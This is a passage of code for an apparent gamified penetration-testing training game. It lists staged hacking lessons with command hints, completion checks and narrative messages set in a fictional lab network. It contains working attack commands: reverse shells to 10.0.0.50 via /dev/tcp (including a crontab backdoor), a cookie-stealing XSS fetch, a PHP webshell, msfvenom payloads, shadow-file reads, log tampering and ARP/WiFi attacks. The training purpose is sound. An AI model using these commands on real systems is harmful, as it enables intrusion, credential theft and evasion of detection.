        nar:"DNS translates names to IPs. It holds enormous recon value. Learn to pull every record type.",
        obj:[
          {id:"digA",    l:"dig A record: dig google.com A",           f:(c)=>c.startsWith("dig")&&c.includes(" A")},
          {id:"digMX",   l:"dig MX: dig google.com MX",                f:(c)=>c.startsWith("dig")&&c.includes("MX")},
          {id:"digAXFR", l:"Zone transfer: dig axfr @ns1.target.machine target.machine", f:(c)=>c.includes("axfr")},
        ],
        msg:"Zone transfer succeeded.\nadmin, dev, vpn, backup, internal — every subdomain revealed.\nOne misconfigured DNS server just handed you the entire internal infrastructure map." },
      { id:"4.4", title:"HTTP/S", hints:["curl http://10.0.0.10/","curl -I http://10.0.0.10/","curl http://10.0.0.10/robots.txt"],
        nar:"HTTP is the language of the web. Learn to speak it raw — headers, cookies, methods, status codes.",
        obj:[
          {id:"curlGet", l:"HTTP GET: curl http://10.0.0.10/",         f:(c)=>c.startsWith("curl")&&c.includes("http")&&!c.includes("-I")},
          {id:"curlHead",l:"Headers: curl -I http://10.0.0.10/",       f:(c)=>c.startsWith("curl")&&c.includes("-I")},
          {id:"curlRobo",l:"Check robots.txt: curl http://10.0.0.10/robots.txt", f:(c)=>c.startsWith("curl")&&c.includes("robots")},
        ],
        msg:"Headers exposed: Apache/2.4.41, PHP/7.4.3. Both have public CVEs.\nrobots.txt: /admin, /backup, /internal, /api/v1 — all disallowed.\nRobots.txt tells search engines what NOT to index. It tells attackers exactly where to look." },
      { id:"4.5", title:"Packet Analysis", hints:["tcpdump -i eth0 -n","tcpdump -i eth0 port 80","tcpdump -i eth0 -w capture.pcap","tcpdump -r capture.pcap"],
        nar:"See the actual data. Raw packets. The truth of what's moving across the wire.",
        obj:[
          {id:"tcpBasic",l:"Capture packets: tcpdump -i eth0 -n",     f:(c)=>c.startsWith("tcpdump")&&!c.includes("-r")&&!c.includes("-w")},
          {id:"tcpWrite",l:"Save capture: tcpdump -i eth0 -w capture.pcap", f:(c)=>c.startsWith("tcpdump")&&c.includes("-w")},
          {id:"tcpRead", l:"Read it back: tcpdump -r capture.pcap",   f:(c)=>c.startsWith("tcpdump")&&c.includes("-r")},
        ],
        msg:"HTTP POST captured: username=admin&password=CorpPass2021\nIn plaintext. Port 80. No encryption.\nThis is why HTTPS exists. And why plaintext protocols are dangerous on any network you can reach." },
    ]
  },
  {
    id:5, title:"THE WATCHTOWER", zone:"/opt/recon", color:"#ffb74d", icon:"▣", badge:"SCOUT",
    intro:"Before touching a target — before a single packet — you observe.\nRecon first. Always.\nKnow everything about the target before it knows you exist.",
    stages:[
      { id:"5.1", title:"Passive Recon", hints:["whois target.machine","openssl s_client -connect 10.0.0.10:443","cat google_dorking.txt"],
        nar:"Passive recon leaves zero trace. You gather from sources that already exist publicly.",
        obj:[
          {id:"whois",   l:"WHOIS lookup: whois target.machine",       f:(c)=>c.startsWith("whois")},
          {id:"openssl", l:"SSL cert info: openssl s_client -connect 10.0.0.10:443", f:(c)=>c.startsWith("openssl")&&c.includes("s_client")},
          {id:"googDork",l:"cat google_dorking.txt",                   f:(c)=>c.includes("google_dorking")},
        ],
        msg:"WHOIS: AXIOM SYSTEMS LTD.\nSSL SANs: internal.axiom-systems.com, vpn.axiom-systems.com, access.axiom-systems.com.\nSubdomains discovered without sending a single scan packet." },
      { id:"5.2", title:"DNS Enumeration", hints:["dnsrecon -d target.machine","dig axfr @ns1.target.machine target.machine","for sub in admin mail vpn; do dig $sub.target.machine; done"],
        nar:"DNS is a goldmine. Zone transfers, brute force, tool-assisted enumeration — pull everything.",
        obj:[
          {id:"dnsrecon",l:"dnsrecon -d target.machine",               f:(c)=>c.startsWith("dnsrecon")},
          {id:"subBrute",l:"Brute-force subdomains with a loop",       f:(c)=>c.includes("for ")&&c.includes("dig")},
        ],
        msg:"dnsrecon found 7 subdomains. Zone transfer confirmed all.\nEvery internal host mapped without touching a port scanner." },
      { id:"5.3", title:"OSINT", hints:["theHarvester -d target.machine -b google","exiftool employee_photo.jpg","cat methodology.txt"],
        nar:"Open Source Intelligence — everything publicly available about the target and its people.",
        obj:[
          {id:"harvest",  l:"theHarvester -d target.machine -b google", f:(c)=>c.includes("theHarvester")||c.includes("theharvester")},
          {id:"exiftool1",l:"Metadata: exiftool employee_photo.jpg",   f:(c)=>c.startsWith("exiftool")},
          {id:"method",   l:"cat methodology.txt",                     f:(c)=>c.includes("methodology")},
        ],
        msg:"theHarvester: 3 employee emails found.\nexiftool: GPS coords in photo, author: J. Richardson — VP of Infrastructure.\nJob posting: 'Must know Cisco ASA, Apache 2.4, MySQL 5.7' — the entire tech stack, in a job ad." },
      { id:"5.4", title:"Active Recon", hints:["arp-scan --localnet","for i in $(seq 1 20); do ping -c1 -W1 10.0.0.$i &>/dev/null && echo $i; done","nc -v 10.0.0.10 22"],
        nar:"Now you interact with the target. You will leave traces. Be deliberate.",
        obj:[
          {id:"arpScan",  l:"ARP scan: arp-scan --localnet",           f:(c)=>c.includes("arp-scan")},
          {id:"pingSweep",l:"Ping sweep with a bash loop",             f:(c)=>c.includes("for")&&c.includes("ping")},
          {id:"banner",   l:"Banner grab: nc -v 10.0.0.10 22",        f:(c)=>c.startsWith("nc")&&c.includes("10.0.0.10")},
        ],
        msg:"Four live hosts: .1, .10, .20, .100.\nSSH banner: OpenSSH 7.2p2 — CVE-2016-6210 username enumeration applies.\nYou note it. Not yet. Soon." },
      { id:"5.5", title:"Document Everything", hints:["mkdir workspace","echo '[target]' > workspace/notes.txt","cat methodology.txt"],
        nar:"Recon is intelligence work. Build the target picture. Document systematically.",
        obj:[
          {id:"workspace",l:"mkdir workspace && cd workspace",         f:(c)=>c.startsWith("mkdir")},
          {id:"targetFile",l:"Create target notes file",               f:(c)=>c.includes("notes")||c.includes("target")},
        ],
        msg:"A target profile.\nIPs, subdomains, open services, tech stack, credentials found, attack vectors.\nThis separates professionals from people who just run tools." },
    ]
  },
  {
    id:6, title:"THE SCANNER", zone:"/opt/scan", color:"#ffb74d", icon:"▪", badge:"SCOUT",
    intro:"Recon showed you the shape. Scanning reveals every detail.\nEvery open port. Every service. Every version. Every vulnerability.\nBy the time you finish, you'll know this target better than its admins.",
    stages:[
      { id:"6.1", title:"Nmap Fundamentals", hints:["nmap 10.0.0.10","nmap -sV 10.0.0.10","nmap -sC -sV 10.0.0.10","nmap -A 10.0.0.10"],
        nar:"nmap is the standard. Learn every flag. You'll use this tool every single day.",
        obj:[
          {id:"nmapBasic",l:"Basic scan: nmap 10.0.0.10",              f:(c)=>c.startsWith("nmap")&&c.includes("10.0.0")&&!c.includes("-")},
          {id:"nmapSV",   l:"Version detection: nmap -sV 10.0.0.10",  f:(c)=>c.startsWith("nmap")&&c.includes("-sV")},
          {id:"nmapSC",   l:"Default scripts: nmap -sC 10.0.0.10",    f:(c)=>c.startsWith("nmap")&&c.includes("-sC")},
          {id:"nmapA",    l:"Aggressive: nmap -A 10.0.0.10",          f:(c)=>c.startsWith("nmap")&&c.includes("-A")},
        ],
        msg:"Ports 22, 80, 3306 open.\n-A revealed robots.txt disallowing /admin /backup /internal /api/v1\nService versions exposed. Searchsploit time." },
      { id:"6.2", title:"Nmap NSE Scripts", hints:["nmap --script=vuln 10.0.0.10","nmap --script=http-enum 10.0.0.10 -p80","nmap --script=smb-enum-shares 10.0.0.10"],
        nar:"The Nmap Scripting Engine turns nmap into a full enumeration platform. Hundreds of scripts available.",
        obj:[
          {id:"nmapVuln",  l:"Vuln scan: nmap --script=vuln 10.0.0.10",          f:(c)=>c.includes("nmap")&&c.includes("vuln")},
          {id:"nmapHttp",  l:"HTTP enum: nmap --script=http-enum 10.0.0.10 -p80", f:(c)=>c.includes("nmap")&&c.includes("http-enum")},
          {id:"nmapSmb",   l:"SMB: nmap --script=smb-enum-shares 10.0.0.10",     f:(c)=>c.includes("nmap")&&c.includes("smb")},
        ],
        msg:"vuln script found: CVE-2021-41773 — Apache Path Traversal/RCE.\nsmb-enum-shares found: Public share with no password.\nSearchsploit has a working exploit for that CVE." },
      { id:"6.3", title:"Service Enumeration", hints:["ftp 10.0.0.10","nc -v 10.0.0.10 25","snmpwalk -v1 -c public 10.0.0.10","enum4linux -a 10.0.0.10"],
        nar:"Each service speaks its own protocol. Enumerate them manually — banner grab, try default credentials, extract info.",
        obj:[
          {id:"ftpEnum",   l:"FTP: ftp 10.0.0.10 (try anonymous)",     f:(c)=>c.startsWith("ftp")},
          {id:"snmpEnum",  l:"SNMP: snmpwalk -v1 -c public 10.0.0.10", f:(c)=>c.startsWith("snmpwalk")},
          {id:"enum4l",    l:"SMB full enum: enum4linux -a 10.0.0.10", f:(c)=>c.startsWith("enum4linux")},
        ],
        msg:"FTP anonymous login: allowed.\nPublic SMB share contains IT_Backups/password_list_2019.txt.\nSNMP community string 'public' — hostname, OS, network interfaces all exposed." },
      { id:"6.4", title:"Web Enumeration", hints:["gobuster dir -u http://10.0.0.10/ -w /usr/share/wordlists/dirb/common.txt","nikto -h http://10.0.0.10/","whatweb http://10.0.0.10/"],
        nar:"Web applications are the most common attack surface. Enumerate them completely.",
        obj:[
          {id:"gobust",   l:"Directory bust: gobuster dir -u http://10.0.0.10/ -w /usr/share/wordlists/dirb/common.txt", f:(c)=>c.startsWith("gobuster")||c.startsWith("dirb")},
          {id:"nikto",    l:"Web scanner: nikto -h http://10.0.0.10/", f:(c)=>c.startsWith("nikto")},
          {id:"whatweb",  l:"Fingerprint: whatweb http://10.0.0.10/",  f:(c)=>c.startsWith("whatweb")},
        ],
        msg:"gobuster found: /admin (301), /.env (200), /backup (403), /api (301).\nnikto: PHP version exposed, cookie missing Secure flag, backup directory.\n.env files often contain database credentials and API keys." },
      { id:"6.5", title:"Vulnerability Research", hints:["searchsploit Apache 2.4","searchsploit -m 50383","cat /opt/scan/nmap_cheatsheet.txt"],
        nar:"Once you have service versions, find known exploits. This is the bridge between scanning and exploitation.",
        obj:[
          {id:"srchspl",  l:"searchsploit Apache 2.4",                 f:(c)=>c.startsWith("searchsploit")&&!c.includes("-m")},
          {id:"srchCopy", l:"Copy exploit: searchsploit -m 50383",     f:(c)=>c.startsWith("searchsploit")&&c.includes("-m")},
        ],
        msg:"47 results. Narrowed to 3 matching your exact version.\nOne has a working PoC that returns RCE.\nAlways read the exploit code before running it. Understand what it does." },
    ]
  },
  {
    id:7, title:"THE WEB", zone:"/var/www", color:"#ff4444", icon:"⬡", badge:"OPERATOR",
    intro:"Web applications are the most common entry point.\nOWASP catalogues the most critical vulnerabilities every year.\nYou're going to learn every one — not just conceptually, but how to test for them.",
    stages:[
      { id:"7.1", title:"SQL Injection", hints:["curl -X POST http://10.0.0.10/admin/login.php -d \"username=admin'--&password=x\"","sqlmap -u 'http://10.0.0.10/login.php' --forms","cat /home/stranger/Documents/sqli_notes.txt"],
        nar:"SQLi is the most persistent web vulnerability. User input inserted into SQL queries without sanitisation.",
        obj:[
          {id:"sqliManual",l:"Manual test: curl -X POST .../login.php -d \"username=admin'--&password=x\"", f:(c)=>c.includes("curl")&&c.includes("admin'")},
          {id:"sqlmap",    l:"Automated: sqlmap -u 'http://10.0.0.10/login.php' --forms", f:(c)=>c.startsWith("sqlmap")},
        ],
        msg:"admin'-- bypassed authentication.\nThe query: SELECT * FROM users WHERE username='admin'--' AND pass='x'\n-- comments out the password check. The database returns the admin row. Login succeeds.\n\nsqlmap extracted the full database: 847 users, admin password in plaintext in config table." },
      { id:"7.2", title:"XSS", hints:["Reflected: <script>alert(1)</script> in a search field","Stored persists — inject into a comment field: comment <script>alert(1)</script>","<script>fetch('http://10.0.0.50/'+document.cookie)</script>"],
        nar:"Cross-Site Scripting injects JavaScript into a page. It runs in every visitor's browser.",
        obj:[
          {id:"xssRefl",  l:"Reflected XSS: test <script>alert(1)</script> in input",    f:(c,o)=>o.includes("XSS")&&c.includes("script")},
          {id:"xssStore", l:"Stored XSS: put a payload in a comment field",       f:(c,o)=>o.includes("STORED")},
          {id:"xssCookie",l:"Cookie theft: <script>fetch('http://10.0.0.50/'+document.cookie)</script>", f:(c)=>c.includes("document.cookie")},
        ],
        msg:"The comment field stored the payload.\nEvery user loading that page runs your JavaScript.\nYou have their session cookies. Their sessions. Their accounts." },
      { id:"7.3", title:"File Inclusion", hints:["curl http://10.0.0.10/?page=../../../etc/passwd","curl http://10.0.0.10/?page=../../../etc/shadow","Test for RFI if allow_url_include=On"],
        nar:"LFI/RFI — when a web app includes files based on user input, you control what it includes.",
        obj:[
          {id:"lfiBasic", l:"LFI: curl http://10.0.0.10/?page=../../../etc/passwd", f:(c)=>c.includes("curl")&&c.includes("../")&&c.includes("passwd")},
          {id:"lfiShadow",l:"Try: curl http://10.0.0.10/?page=../../../etc/shadow", f:(c)=>c.includes("../")&&c.includes("shadow")},
        ],
        msg:"LFI returned /etc/passwd. Every username on the system.\nThe PHP code likely does: include($_GET['page'].'.php')\nYou can read any file the web server has permission to read." },
      { id:"7.4", title:"Command Injection", hints:["Test 127.0.0.1; id in a ping field","curl http://10.0.0.10/ping.php -d 'ip=127.0.0.1; id'","Get a reverse shell: 127.0.0.1; bash -i >& /dev/tcp/10.0.0.50/4444 0>&1"],
        nar:"When user input is passed to the OS — the web application becomes a command shell.",
        obj:[
          {id:"cmdInj",   l:"Test injection: curl .../ping.php -d 'ip=127.0.0.1; id'", f:(c)=>c.includes("curl")&&c.includes("; id")},
          {id:"cmdShell", l:"Get a shell: ip=127.0.0.1; bash -i >& /dev/tcp/10.0.0.50/4444 0>&1", f:(c)=>c.includes("bash")&&c.includes("/dev/tcp")&&c.includes("4444")},
        ],
        msg:"The ping field executed your command.\nid returned www-data.\nReverse shell connected. You're inside the target machine." },
      { id:"7.5", title:"Authentication Attacks", hints:["hydra -l admin -P rockyou.txt http-post-form '//login.php:user=^USER^&pass=^PASS^:Invalid'","Test default credentials: admin/admin, admin/password, admin/admin123"],
        nar:"Weak authentication is everywhere. Dictionary attacks, default creds, password spray.",
        obj:[
          {id:"hydra",    l:"Hydra brute force: hydra -l admin -P rockyou.txt ...", f:(c)=>c.startsWith("hydra")},
          {id:"defCreds", l:"Test default creds: curl -d 'user=admin&pass=admin' http://10.0.0.10/admin/login.php", f:(c)=>c.includes("curl")&&c.includes("admin")&&c.includes("pass=")},
        ],
        msg:"Hydra found it: admin / admin123. Position 247 in rockyou.txt.\nBrute force completed in 4 minutes.\nThis is why password policies and rate limiting exist." },
      { id:"7.6", title:"SSRF and JWT", hints:["curl http://10.0.0.10/fetch.php -d 'url=http://localhost/admin'","curl .../fetch.php -d 'url=http://169.254.169.254/latest/meta-data/'","Decode JWT: echo TOKEN | base64 -d"],
        nar:"SSRF makes the server fetch internal resources. JWT attacks let you forge authentication tokens.",
        obj:[
          {id:"ssrf",     l:"SSRF: curl .../fetch.php -d 'url=http://localhost/admin'", f:(c)=>c.includes("fetch.php")||c.includes("localhost/admin")},
          {id:"ssrfMeta", l:"Cloud SSRF: curl .../fetch.php -d 'url=http://169.254.169.254/latest/meta-data/'", f:(c)=>c.includes("169.254.169.254")},
          {id:"jwtDecode",l:"Decode JWT: echo TOKEN | base64 -d",     f:(c)=>c.includes("base64")&&c.includes("-d")},
        ],
        msg:"SSRF to AWS metadata endpoint returned IAM credentials.\nJWT with alg:none — you changed role from 'user' to 'admin', removed the signature, API accepted it.\nModern web security failures. Classic, but still everywhere." },
    ]
  },
  {
    id:8, title:"THE ARMORY", zone:"/opt/exploit", color:"#ff4444", icon:"◇", badge:"OPERATOR",
    intro:"You've found vulnerabilities. Now you learn to exploit them systematically.\nMetasploit. Custom payloads. Reverse shells.\nThe difference between knowing a vulnerability exists and weaponising it.",
    stages:[
      { id:"8.1", title:"Metasploit Framework", hints:["msfconsole","search ms17-010","use exploit/windows/smb/ms17_010_eternalblue","show options","set RHOSTS 10.0.0.10","run"],
        nar:"Metasploit is the industry-standard exploitation framework. Learn to navigate it completely.",
        obj:[
          {id:"msfStart", l:"Start Metasploit: msfconsole",             f:(c)=>c==="msfconsole"},
          {id:"msfSearch",l:"Search: search ms17-010",                  f:(c)=>c.startsWith("search ")},
          {id:"msfSet",   l:"Set target: set RHOSTS 10.0.0.10",        f:(c)=>c.startsWith("set ")&&c.includes("RHOSTS")},
          {id:"msfRun",   l:"Execute: run",                             f:(c)=>c==="run"||c==="exploit"},
        ],
        msg:"Meterpreter session opened.\nNot just a shell — a full featured post-exploitation platform inside the target." },
      { id:"8.2", title:"Meterpreter", hints:["sysinfo","getuid","getsystem","hashdump","shell"],
        nar:"Meterpreter is a powerful post-exploitation shell with built-in capabilities far beyond a standard shell.",
        obj:[
          {id:"sysinfo",  l:"sysinfo — machine information",           f:(c)=>c==="sysinfo"},
          {id:"getuid",   l:"getuid — who are you on the target?",     f:(c)=>c==="getuid"},
          {id:"getsys",   l:"getsystem — attempt privilege escalation",f:(c)=>c==="getsystem"},
          {id:"hashdump", l:"hashdump — dump password hashes",         f:(c)=>c==="hashdump"},
        ],
        msg:"hashdump returned the Administrator NTLM hash.\nPass-the-hash works — you don't need to crack it.\nOr crack it offline: hashcat -m 1000 hash.txt rockyou.txt" },
      { id:"8.3", title:"Payload Generation", hints:["msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.50 LPORT=4444 -f elf -o shell.elf","msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.50 LPORT=4444 -f raw -o shell.php"],
        nar:"msfvenom generates custom payloads for any OS, any architecture, any format.",
        obj:[
          {id:"msfvList",  l:"List payloads: msfvenom -l payloads | grep linux",         f:(c)=>c.startsWith("msfvenom")&&c.includes("-l")},
          {id:"msfvLinux", l:"Linux payload: msfvenom -p linux/x64/shell_reverse_tcp ...",f:(c)=>c.startsWith("msfvenom")&&c.includes("-p")&&c.includes("-f")},
        ],
        msg:"74 bytes. A reverse shell in an ELF binary.\nOr a PHP file. Or a Windows executable. Or a raw shellcode buffer.\nmsfvenom speaks every format every OS understands." },
      { id:"8.4", title:"Manual Exploitation", hints:["searchsploit Apache 2.4","searchsploit -m 50383","python3 50383.py http://10.0.0.10/"],
        nar:"Metasploit won't always have a module. Learn to exploit manually — download, read, modify, run.",
        obj:[
          {id:"srchFind",  l:"searchsploit Apache 2.4",                f:(c)=>c.startsWith("searchsploit")},
          {id:"srchCopy2", l:"Copy exploit: searchsploit -m 50383",    f:(c)=>c.startsWith("searchsploit")&&c.includes("-m")},
          {id:"runExpl",   l:"python3 50383.py http://10.0.0.10/",     f:(c)=>c.startsWith("python3")&&c.includes(".py")&&c.includes("http")},
        ],
        msg:"The exploit ran. RCE confirmed. Shell returned.\nManual exploitation — no framework. Just Python, a CVE, and understanding.\nAlways read exploit code before running it. Always." },
      { id:"8.5", title:"Reverse Shells", hints:["cat shells.txt","nc -lvnp 4444","bash -i >& /dev/tcp/10.0.0.50/4444 0>&1","python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"],
        nar:"The reverse shell is the fundamental technique. Master every variant. Know how to stabilise them.",
        obj:[
          {id:"readShells",l:"cat shells.txt — learn all variants",    f:(c)=>c.includes("shells.txt")},
          {id:"ncListen2", l:"Set up listener: nc -lvnp 4444",        f:(c)=>c.includes("nc")&&c.includes("-l")&&c.includes("4444")},
          {id:"stableShell",l:"Stabilise: python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", f:(c)=>c.includes("pty")&&c.includes("spawn")},
        ],
        msg:"A fully interactive TTY. Tab completion. Ctrl+C works without killing the shell.\nThis is what separates a usable shell from a frustrating one.\nAlways stabilise before doing anything serious." },
    ]
  },
  {
    id:9, title:"THE UNDERGROUND", zone:"/root", color:"#e040fb", icon:"▲", badge:"SPECIALIST",
    intro:"You have a foothold. Low-privilege access.\nThat's not enough.\nRoot. Persistence. Lateral movement.\nThis chapter is about going from 'in' to 'owning everything'.",
    stages:[
      { id:"9.1", title:"Linux Privilege Escalation", hints:["sudo -l","find / -perm -u=s -type f 2>/dev/null","cat /etc/crontab","./linpeas.sh"],
        nar:"You're www-data or nobody. You need root. There are always paths. Be systematic.",
        obj:[
          {id:"sudoL2",    l:"sudo -l — what can you run as root?",    f:(c)=>c.includes("sudo")&&c.includes("-l")},
          {id:"suidsFind", l:"find / -perm -u=s -type f 2>/dev/null", f:(c)=>c.includes("find")&&c.includes("-perm")&&c.includes("s")},
          {id:"linpeas",   l:"Run linpeas.sh for automated enumeration",f:(c)=>c.includes("linpeas")},
          {id:"gtfobins2", l:"cat gtfobins.txt — exploit a SUID binary",f:(c)=>c.includes("gtfobins")},
        ],
        msg:"vim has SUID. sudo allows vim NOPASSWD.\nGTFOBins: sudo vim -c ':!/bin/bash'\nRoot shell. The machine is yours." },
      { id:"9.2", title:"Persistence", hints:["echo 'pubkey' >> /root/.ssh/authorized_keys","echo '* * * * * root bash -i >& /dev/tcp/10.0.0.50/4444 0>&1' >> /etc/crontab","echo '<?php system($_GET[\"c\"]); ?>' > /var/www/html/img.php"],
        nar:"Getting in once is luck. Staying in is craft. Plant multiple persistence mechanisms.",
        obj:[
          {id:"sshKey",    l:"SSH backdoor: echo 'KEY' >> /root/.ssh/authorized_keys", f:(c)=>c.includes("authorized_keys")},
          {id:"cronBack",  l:"Cron backdoor: add reverse shell to /etc/crontab",       f:(c)=>c.includes("crontab")&&(c.includes("/dev/tcp")||c.includes("reverse"))},
          {id:"webShell",  l:"Webshell: echo '<?php system($_GET[\"c\"]); ?>' > /var/www/html/img.php", f:(c)=>c.includes("system")&&c.includes("GET")&&c.includes("php")},
        ],
        msg:"Three persistence mechanisms in place.\nSSH key — silent, permanent.\nCron reverse shell — reconnects every minute.\nWebshell — HTTP access via the web server.\nYou won't be locked out again." },
      { id:"9.3", title:"Credential Harvesting", hints:["cat /etc/shadow","cat ~/.bash_history","grep -r 'password' /var/www 2>/dev/null","env | grep -i pass"],
        nar:"Credentials are currency in a compromised environment. Find every one.",
        obj:[
          {id:"shadowRead",l:"cat /etc/shadow (you have root now)",    f:(c)=>c.includes("shadow")&&c.includes("cat")},
          {id:"histCreds", l:"cat ~/.bash_history — find credentials in history", f:(c)=>c.includes("bash_history")},
          {id:"grepCreds", l:"grep -r 'password' /var/www /opt 2>/dev/null",     f:(c)=>c.startsWith("grep")&&c.includes("-r")&&c.includes("pass")},
        ],
        msg:"Shadow file: 6 hashed passwords. John cracked 4 in under 10 minutes.\nbash_history: mysql connection with root password. Same password used elsewhere — common.\nConfig files: database credentials for every application." },
      { id:"9.4", title:"Lateral Movement", hints:["ssh user@10.0.0.20 (with harvested creds)","ssh -D 1080 user@10.0.0.10","proxychains nmap -sT 10.0.0.20"],
        nar:"One machine is a start. The goal is the whole network. Pivot using your foothold.",
        obj:[
          {id:"sshLat",    l:"SSH to next machine with harvested creds", f:(c)=>c.startsWith("ssh")&&c.includes("10.0.0.20")},
          {id:"socksPrx",  l:"SOCKS proxy: ssh -D 1080 user@10.0.0.10", f:(c)=>c.includes("ssh")&&c.includes("-D")&&c.includes("1080")},
          {id:"proxychain",l:"Route tools: proxychains nmap -sT 10.0.0.20", f:(c)=>c.startsWith("proxychains")},
        ],
        msg:"SOCKS proxy established through 10.0.0.10.\nProxychains routes nmap through the pivot — you can scan 10.0.0.20 from this machine.\nLateral movement: one foothold becomes access to the entire subnet." },
      { id:"9.5", title:"Post-Exploitation Cleanup", hints:["history -c","echo '' > ~/.bash_history","sed -i '/10.0.0.50/d' /var/log/auth.log","touch -t 202201010000 modified_file"],
        nar:"Understand what traces you leave — as an attacker, and as a defender who must find them.",
        obj:[
          {id:"histClear", l:"Clear bash history: history -c && echo '' > ~/.bash_history", f:(c)=>c.includes("history -c")||c.includes("bash_history")&&c.includes("echo")},
          {id:"logTamper", l:"sed -i '/your_ip/d' /var/log/auth.log",  f:(c)=>c.startsWith("sed")&&c.includes("auth.log")},
          {id:"timestamp", l:"Alter timestamps: touch -t 202201010000 file", f:(c)=>c.startsWith("touch")&&c.includes("-t")},
        ],
        msg:"You cleared the history. Deleted auth.log entries. Altered timestamps.\nBut /var/log/syslog still has inode change events.\nThe backup server captured everything in real-time via rsyslog.\nLogs are almost never truly gone. Defenders know this." },
    ]
  },
  {
    id:10, title:"THE BATTLEFIELD", zone:"/sys/net", color:"#e040fb", icon:"◈", badge:"SPECIALIST",
    intro:"The network itself is a battlefield.\nARP can be manipulated. DNS can be poisoned. WiFi can be broken.\nThese are attacks at the packet level.",
    stages:[
      { id:"10.1", title:"ARP Spoofing", hints:["arpspoof -i eth0 -t 10.0.0.50 10.0.0.1","echo 1 > /proc/sys/net/ipv4/ip_forward","ettercap -T -M arp:remote /10.0.0.1// /10.0.0.50//"],
        nar:"ARP has no authentication. Anyone can claim any MAC. Claim the gateway's MAC and all traffic flows through you.",
        obj:[
          {id:"arpSpoof",  l:"ARP spoof: arpspoof -i eth0 -t 10.0.0.50 10.0.0.1", f:(c)=>c.startsWith("arpspoof")},
          {id:"ipForward", l:"Enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward", f:(c)=>c.includes("ip_forward")&&c.includes("1")},
          {id:"ettercap",  l:"Full MITM: ettercap -T -M arp:remote /10.0.0.1// /10.0.0.50//", f:(c)=>c.startsWith("ettercap")},
        ],
        msg:"You're in the middle. Every packet from 10.0.0.50 to the internet passes through your machine.\nYou can read it. Modify it. Drop it.\nHTTP traffic in plaintext. Credentials visible." },
      { id:"10.2", title:"MITM and SSL Strip", hints:["tcpdump -i eth0 -A port 80","mitmproxy","Read about SSLstrip — forcing HTTP downgrade"],
        nar:"In position. Now intercept, analyse, and modify traffic.",
        obj:[
          {id:"tcpMitm",  l:"Capture MITM traffic: tcpdump -i eth0 -A port 80", f:(c)=>c.startsWith("tcpdump")&&c.includes("port 80")},
          {id:"mitmproxy",l:"HTTP intercept: mitmproxy",                 f:(c)=>c.startsWith("mitmproxy")},
        ],
        msg:"A POST request in plaintext: username=admin&password=CorpPass2021\nHTTP. No TLS. The credentials of a real user, visible in transit.\nThis is why HTTPS-only policies exist. This is why HSTS matters." },
      { id:"10.3", title:"WiFi Attacks", hints:["airmon-ng start wlan0","airodump-ng wlan0mon","aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon","aircrack-ng capture.cap -w rockyou.txt"],
        nar:"Wireless networks are everywhere. WPA2 can be broken if the password is in a wordlist.",
        obj:[
          {id:"airmon",   l:"Monitor mode: airmon-ng start wlan0",     f:(c)=>c.startsWith("airmon-ng")},
          {id:"airodump", l:"Scan WiFi: airodump-ng wlan0mon",         f:(c)=>c.startsWith("airodump-ng")},
          {id:"deauth",   l:"Force reconnect: aireplay-ng --deauth 10 -a [BSSID] wlan0mon", f:(c)=>c.startsWith("aireplay-ng")&&c.includes("deauth")},
          {id:"aircrack", l:"Crack: aircrack-ng capture.cap -w rockyou.txt", f:(c)=>c.startsWith("aircrack-ng")},
        ],
        msg:"WPA2 handshake captured via deauth.\naircrack-ng: KEY FOUND — password123 (4 minutes against rockyou.txt).\nThe WiFi password. And WiFi passwords are almost always reused on internal systems." },
      { id:"10.4", title:"DNS Attacks", hints:["dnschef --fakeip 10.0.0.50 --fakedomains target.com","Read about DNS cache poisoning — how it works","ettercap dns_spoof plugin"],
        nar:"Control DNS and you control where traffic goes — silently redirect any domain to your machine.",
        obj:[
          {id:"dnschef",  l:"Fake DNS: dnschef --fakeip 10.0.0.50 --fakedomains target.com", f:(c)=>c.startsWith("dnschef")},
          {id:"dnsPois",  l:"Understand DNS cache poisoning — read the output carefully",     f:(c,o)=>o.includes("DNS")&&o.includes("poisoning")},
        ],
        msg:"target.com now resolves to your machine for every client on this segment.\nWhen they browse to target.com they see your clone.\nTheir credentials go to you." },
      { id:"10.5", title:"Bluetooth Recon", hints:["hcitool scan","btscanner","hcitool lescan"],
        nar:"Bluetooth is everywhere — keyboards, mice, phones. Often completely ignored from a security standpoint.",
        obj:[
          {id:"hciscan",  l:"Discover BT devices: hcitool scan",       f:(c)=>c.startsWith("hcitool")&&c.includes("scan")},
          {id:"btscanner",l:"Full recon: btscanner",                   f:(c)=>c.startsWith("btscanner")},
          {id:"hciBle",   l:"BLE scan: hcitool lescan",                f:(c)=>c.startsWith("hcitool")&&c.includes("lescan")},
        ],
        msg:"Three Bluetooth devices found. A wireless keyboard transmitting keystrokes.\nUnencrypted HID traffic. Keystrokes sniffable with ubertooth-one or a BT sniffer.\nEvery key the admin presses. Including passwords." },
    ]
  },
  {
    id:11, title:"THE VAULT", zone:"/etc/crypto", color:"#4dd0e1", icon:"◉", badge:"SPECIALIST",
    intro:"Security lives and dies on cryptography.\nPasswords. Hashes. Encryption.\nThis chapter is about understanding the math deeply enough to break it when it's implemented badly.",
    stages:[
      { id:"11.1", title:"Hashing and Cracking", hints:["cat hashing.txt","hash-identifier","hashcat -m 0 hash.txt rockyou.txt","john --wordlist=rockyou.txt hash.txt"],
        nar:"Passwords are stored as hashes. One-way — in theory. In practice, weak passwords fall to dictionaries.",
        obj:[
          {id:"hashInfo",  l:"cat hashing.txt — understand hash types",f:(c)=>c.includes("hashing.txt")},
          {id:"hashId",    l:"hash-identifier — identify a hash type", f:(c)=>c.startsWith("hash-identifier")},
          {id:"hashcat",   l:"hashcat -m 0 hash.txt rockyou.txt",      f:(c)=>c.startsWith("hashcat")&&c.includes("-m 0")},
          {id:"johnCrack", l:"john --wordlist=rockyou.txt hash.txt",   f:(c)=>c.startsWith("john")},
        ],
        msg:"5f4dcc3b5aa765d61d8327deb882cf99 → password\nMD5. Cracked in milliseconds.\nMD5 and SHA1 are dead for passwords. bcrypt or Argon2 only." },
      { id:"11.2", title:"Advanced Cracking", hints:["hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule","hashcat -m 0 hash.txt -a 3 ?u?l?l?l?d?d?d?d","hashcat -m 1000 ntlm.txt rockyou.txt"],
